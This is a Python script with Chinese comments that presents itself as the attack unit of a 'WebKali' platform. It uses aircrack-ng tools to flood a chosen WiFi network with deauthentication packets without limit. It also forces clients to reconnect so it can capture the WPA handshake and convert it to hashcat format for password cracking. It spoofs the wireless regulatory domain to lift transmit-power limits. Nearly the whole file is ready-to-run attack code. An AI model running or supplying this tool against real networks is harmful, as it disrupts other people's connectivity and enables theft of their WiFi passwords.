import argparse
import subprocess
import time
import os
import sys
import shutil
import glob

# ==========================================
# WebKali 攻击执行单元 (完整无删减修复版)
# ==========================================

# 修复环境变量，确保能找到工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞，返回结果"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg, level="INFO"):
    """格式化输出，方便后端和前端读取"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    print(f"[{level}] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...", "DEBUG")

    # 0. 【关键修复】杀掉干扰进程 (非常重要，特别是针对 5GHz Channel 40)
    # NetworkManager 会不断重置网卡信道，必须杀掉
    run_cmd("airmon-ng check kill")

    # 试图设置监管域为玻利维亚(BO)或全球(00)，以解锁大功率和更多信道
    run_cmd("iw reg set BO")
    run_cmd("iwconfig moving_limits off") # 尝试移除功率限制

    # 1. 尝试使用 airmon-ng (更稳定，会自动处理虚拟接口)
    # 注意：如果 interface 已经是 monitor 模式 (如 wlan0mon)，airmon-ng 也能处理
    if shutil.which("airmon-ng"):
        run_cmd(f"ip link set {interface} down")
        # 强制指定信道启动
        run_cmd(f"airmon-ng start {interface} {channel}")
        run_cmd(f"ip link set {interface} up")
    else:
        # 2. 强制使用 iw/ip 命令设置 (备用方案)
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")

    # 3. 【关键修复】强制双重锁定信道
    # 对于 5GHz，如果不强制锁定，airodump-ng 启动瞬间可能会跳频
    run_cmd(f"iw dev {interface} set channel {channel}")
    run_cmd(f"iwconfig {interface} channel {channel}")

    time.sleep(2)  # 等待网卡硬件就绪
    log(f"网卡 {interface} 已锁定在信道 {channel}", "SUCCESS")


def attack_deauth(bssid, interface, duration):
    """
    执行 Deauth 洪水攻击
    duration: 0 表示无限攻击，直到被 kill
    """
    log(f"🔥 开始 Deauth 攻击目标: {bssid} (Duration: {duration}s)", "INFO")

    # -0 0 表示无限次发送 Deauth 包
    # --ignore-negative-one 修复部分网卡报错
    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"

    # 使用 Popen 启动，以便我们可以实时获取输出
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    start_time = time.time()

    try:
        # 实时读取输出并打印
        while True:
            if duration > 0 and (time.time() - start_time) > duration:
                log("攻击时间已到，自动停止", "INFO")
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            if line:
                line = line.strip()
                # 过滤并显示关键日志
                if "Sending" in line:
                    # 降低刷屏频率
                    if int(time.time()) % 3 == 0:
                        print(f"[Attack] ⚡ 正在发送 Deauth 攻击包... (目标已断线)")
                elif "Waiting for beacon frame" in line:
                    print(f"[Search] 正在寻找目标信号... (信道可能不匹配)")
                elif "No such device" in line:
                    print(f"[Error] 网卡丢失或被占用！")
                    break

            sys.stdout.flush()

    except KeyboardInterrupt:
        log("攻击被用户终止", "INFO")
    finally:
        try:
            process.terminate()
        except:
            pass
        run_cmd("killall aireplay-ng")
        log("攻击进程已结束", "SYSTEM")


def capture_handshake(bssid, interface, channel, duration):
    """
    【补全代码】完整的握手包捕获逻辑
    1. 启动 airodump-ng 抓包 (后台)
    2. 启动 aireplay-ng 攻击 (循环)
    3. 实时检查握手包
    """
    duration = int(duration) if int(duration) > 0 else 60
    log(f"启动握手包捕获任务: Target={bssid} IFace={interface}", "START")

    # 临时文件前缀
    clean_bssid = bssid.replace(":", "")
    dump_prefix = f"/tmp/handshake_{clean_bssid}"

    # 清理旧文件
    run_cmd(f"rm -f {dump_prefix}*")

    # 1. 启动抓包进程 (后台)
    # --output-format cap 只输出 cap 文件
    # 必须指定 --channel，防止跳频
    airodump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {dump_prefix} --output-format cap {interface}"

    log(f"启动 airodump-ng 监听信道 {channel}...", "INFO")
    dump_proc = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start_time = time.time()
    handshake_captured = False

    try:
        time.sleep(5)  # 【修复】等待时间增加到5秒，确保 airodump 初始化完成

        while (time.time() - start_time) < duration:
            # 2. 发送攻击包 (增强力度)
            # 5GHz 信号穿透弱，需要更多包才能确保踢掉客户端
            # -0 15 表示发送 15 组 Deauth 包
            log("发送 Deauth 包 (15组) 诱导用户重连...", "ATTACK")
            run_cmd(f"aireplay-ng -0 15 -a {bssid} {interface} --ignore-negative-one")

            # 3. 检查是否有握手包
            # 查找生成的 .cap 文件
            cap_files = glob.glob(f"{dump_prefix}*.cap")
            if cap_files:
                latest_cap = max(cap_files, key=os.path.getctime)

                # 使用 aircrack-ng 检查文件内容是否包含 "1 handshake"
                check_cmd = f"aircrack-ng {latest_cap} | grep '1 handshake'"
                result = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        text=True)

                if "1 handshake" in result.stdout:
                    log("✅ 成功捕获握手包！(WPA Handshake Captured)", "SUCCESS")
                    print("CAPTURED_HS_POTENTIAL")  # 【关键标记】供后端识别
                    handshake_captured = True

                    # 尝试转换为 hashcat 格式 (如果有工具)
                    if shutil.which("hcxpcapngtool"):
                        hc_file = f"{dump_prefix}.hc22000"
                        run_cmd(f"hcxpcapngtool -o {hc_file} {latest_cap}")
                        log(f"已转换为 Hashcat 格式: {hc_file}", "INFO")

                    break

            # 等待 8 秒，给客户端重连的时间 (5GHz 重连通常比 2.4GHz 慢)
            time.sleep(8)

        if not handshake_captured:
            log("超时：未捕获到握手包 (建议缩短距离或检查是否有人在使用)", "FAIL")

    except Exception as e:
        log(f"捕获出错: {e}", "ERROR")
    finally:
        # 清理后台进程
        try:
            dump_proc.terminate()
        except:
            pass
        run_cmd("killall airodump-ng")
        run_cmd("killall aireplay-ng")
        log("捕获任务结束", "SYSTEM")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", help="deauth or handshake")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")
    args = parser.parse_args()

    # 先配置网卡
    setup_monitor(args.interface, args.channel)

    # 根据模式执行
    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, int(args.duration))
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)
    else:
        log("未知模式: " + args.mode, "ERROR")